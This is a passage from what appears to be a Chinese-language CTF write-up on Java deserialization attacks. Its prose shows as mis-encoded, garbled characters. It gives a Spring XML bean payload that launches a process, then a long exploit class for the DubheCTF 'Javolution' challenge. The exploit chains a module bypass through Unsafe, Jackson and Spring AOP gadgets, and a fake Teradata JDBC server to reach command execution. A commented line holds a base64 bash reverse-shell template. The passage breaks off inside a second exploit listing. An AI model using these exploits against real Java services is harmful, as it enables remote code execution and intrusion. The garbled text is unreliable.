ä¸ªæ–¹æ³•å°±å¯ä»¥äº†ï¼Œå¯ä»¥ç›´æ¥ç”¨fjçš„å¹³æ›¿ã€‚</p><p>è¿˜æ¶‰åŠä¸€ä¸ªJVMçš„vm-optionsæ“ä½œï¼Œä¸ç„¶æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨XStringçš„ï¼Œè€Œä¸”pomé‡Œè¿˜éœ€è¦buildç‰¹å®šçš„ä¸œè¥¿ï¼Œä¸ç„¶è¿˜æ˜¯ä¼šæ‰¾ä¸åˆ°åŒ…ï¼ˆæ»¡æ»¡çš„å‘ï¼‰ã€‚</p><p>setFieldValueä¸èƒ½ç›´æ¥å†™ç®€å•çš„åå°„ï¼Œåº”è¯¥è¦åšåˆ°é€’å½’è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œä¸ç„¶ä¹Ÿæ˜¯è°ƒç”¨ä¸åˆ°setPropertyæ–¹æ³•ã€‚</p><p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code>åŒç†å¯é€šï¼Œå‡ºç½‘éšä¾¿æ‰“ï¼š</p><p><code>exp.xml</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150053269.png" alt="image-20240923150053269"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923150000954.png" alt="image-20240923150000954"></p><p>å­¦é•¿çš„æŒ–æ˜é“¾æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923145854643.png" alt="image-20240923145854643"></p><h2 id="2024DubheCTF-Javolution"><a href="#2024DubheCTF-Javolution" class="headerlink" title="2024DubheCTF-Javolution"></a>2024DubheCTF-Javolution</h2><p>æ¬§é˜³å­¦é•¿å‡ºçš„é¢˜ï¼ŒçœŸçš„è´¨é‡å¾ˆé«˜å•Šã€‚</p><p>å…¶å®è¿™é“è·Ÿä¸Šé¢ccbé‚£é“æœ‰åœ°æ–¹é€»è¾‘å¾ˆåƒï¼Œä¹Ÿæ˜¯ç”¨JDBCæ¥æ‰“ï¼Œè¿™é‡Œçš„æ•°æ®åº“å˜æˆäº†Teradataï¼Œä¸åŒçš„ç‚¹åœ¨äºï¼Œä»£ç ä¼šçœŸçš„å¯¹æ•°æ®åº“å‘èµ·ä¸€æ¬¡è¿æ¥ï¼Œæ‰€ä»¥å¿…é¡»çœŸçš„æ­ä¸€ä¸ªTeradataæ•°æ®åº“ï¼Œæˆ–è€…å†™ä¸€ä¸ªTeradataçš„fakeserverã€‚</p><p>å½“ç„¶ï¼Œå¤©æ— ç»äººä¹‹è·¯ï¼Œç¡®å®æœ‰ç°æˆçš„ï¼š</p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">luelueking&#x2F;Deserial_Sink_With_JDBC: Some ReadObject Sink With JDBC (github.com)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151533033.png" alt="image-20240923151533033"></p><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ”»å‡»æ–¹æ³•æ¥è‡ªï¼š<a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf (blackhat.com)</a></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151718933.png" alt="image-20240923151718933"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923151754193.png" alt="image-20240923151754193"></p><p>é¢˜ç›®å‰é¢æ˜¯ä¸€ä¸ªè´Ÿæ•°æº¢å‡ºçš„ç»•è¿‡ï¼Œä»¥åŠæœ€åå¥—ä¸€ä¸ªSSRFï¼ŒåŸŸåè¦åŒ…å«dubheï¼Œ<code>sudo.cc</code>æœ¬å°±æ˜¯æ‰§è¡Œ<code>localhost</code>çš„ï¼Œæ‰€ä»¥<code>dubhe.sudo.cc</code>å³å¯ã€‚å°±ä¸è¯¦ç»†å†™äº†ã€‚æˆ‘ä»¬æŠŠé‡å¿ƒæ”¾åˆ°åé¢jdk17çš„jdbcæ”»å‡»ä¸Šã€‚</p><p>JVMå‚æ•°è®¾ç½®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">--add-opens java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯éš¾ç»·çš„æ˜¯ï¼Œæˆ‘è‡ªå·±å¤ç°æ€ä¹ˆéƒ½è¿ä¸ä¸Šè¿™ä¸ªfakeserverçš„æ•°æ®åº“ï¼Œå¯¼è‡´payloadå‡ºä¸æ¥ï¼Œä¸€ç›´æ‰¾ä¸åˆ°æ–¹æ³•ï¼Œä½œç½¢ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923163621149.png" alt="image-20240923163621149"></p><hr><p>new:è§£å†³è¿™ä¸ªé—®é¢˜äº†ï¼Œfakeserverä¸Šæ”¾fakessoçš„ipåªæ”¾127.0.0.1è€Œä¸æ˜¯vps_ipå¯¼è‡´çš„ï¼Œç¬‘æ‹‰äº†ã€‚</p><p>Gadget-Chainså¯ä»¥æ…¢æ…¢è·Ÿå‡ºæ¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">TeraDataSourceBase.createNewConnection â€“&gt; ConnectionFactory.createConnection <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawConnection</span> â€”&gt; <br>RawConnectionæ„é€ å‡½æ•°å¼•ç”¨çˆ¶ç±»æ„é€ GenericTeradataConnection â€”&gt; GenericTeradataConnectionæ„é€ å‡½æ•°â€”&gt;<br>Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240927202643136.png" alt="image-20240927202643136"></p><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><p>æ€ä¹ˆæ‰“éƒ½éšä¾¿é€šå•Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraDataSource;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraDataSourceBase;<br><span class="hljs-keyword">import</span> com.teradata.jdbc.TeraPooledConnection;<br><span class="hljs-comment">//import org.assertj.core.util.xml.XmlStringPrettyFormatter;</span><br><span class="hljs-keyword">import</span> org.dubhe.javolution.pool.PalDataSource;<br><span class="hljs-comment">//import org.mockito.internal.matchers.Equals;</span><br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//        com.sun.org.apache.xpath.internal.objects.XString</span><br>        <span class="hljs-comment">// --add-opens java.xml/com.sun.org.apache.xpath.internal=ALL-UNNAMED</span><br>        <span class="hljs-keyword">final</span> ArrayList&lt;Class&gt; classes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.HashMap&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.Properties&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.teradata.jdbc.TeraDataSource&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>));<br>        classes.add(Class.forName(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>));<br><span class="hljs-comment">//        classes.add(Class.forName(&quot;java.xml.*&quot;));</span><br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exp2</span>().bypassModule(classes);<br><br>        <span class="hljs-type">TeraDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PalDataSource</span>();<br>        <span class="hljs-comment">//dataSource.setBROWSER(&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br>        dataSource.setBROWSER(<span class="hljs-string">&quot;calc&quot;</span>);<br>        dataSource.setLOGMECH(<span class="hljs-string">&quot;BROWSER&quot;</span>);<br>        dataSource.setDSName(<span class="hljs-string">&quot;vps&quot;</span>);<br>        dataSource.setDbsPort(<span class="hljs-string">&quot;10250&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Module</span> <span class="hljs-variable">baseModule</span> <span class="hljs-operator">=</span> dataSource.getClass().getModule();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> PriorityQueue.class;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.putObject(currentClass, offset, baseModule);<br><br>        Class&lt;?&gt; clazz =<br>                Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(dataSource);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler)<br>                cons.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]<br>                &#123;DataSource.class&#125;, handler);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);<br><br><span class="hljs-comment">//        POJONode pojoNode = new POJONode(dataSource);</span><br><span class="hljs-comment">//        pojoNode.toString();</span><br><br>        <span class="hljs-comment">// com.sun.org.apache.xpath.internal.objects</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(xString,pojoNode);<br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object obj1, Object obj2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(obj2);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(obj1);<br><br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFiledValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFiledValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiledValue</span><span class="hljs-params">(Object obj, String key, Object val)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Field field ;<br>        <span class="hljs-keyword">try</span>&#123;<br>            field = obj.getClass().getDeclaredField(key);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            <span class="hljs-keyword">if</span> (obj.getClass().getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = obj.getClass().getSuperclass().getDeclaredField(key);<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,val);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));</span><br>        <span class="hljs-comment">//oos.writeObject(obj);</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bypassModule</span><span class="hljs-params">(ArrayList&lt;Class&gt; classes)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">currentClass</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">getModuleMethod</span> <span class="hljs-operator">=</span> getMethod(Class.class, <span class="hljs-string">&quot;getModule&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (getModuleMethod != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">for</span> (Class aClass : classes) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">targetModule</span> <span class="hljs-operator">=</span> getModuleMethod.invoke(aClass, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>                        unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>)), targetModule);<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title function_">getMethod</span><span class="hljs-params">(Class clazz, String methodName, Class[] params)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">while</span> (clazz!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                method = clazz.getDeclaredMethod(methodName,params);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">catch</span> (NoSuchMethodException e)&#123;<br>                clazz = clazz.getSuperclass();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            unsafe = (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> unsafe;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240923210118086.png" alt="image-20240923210118086"></p><p>å®˜æ–¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 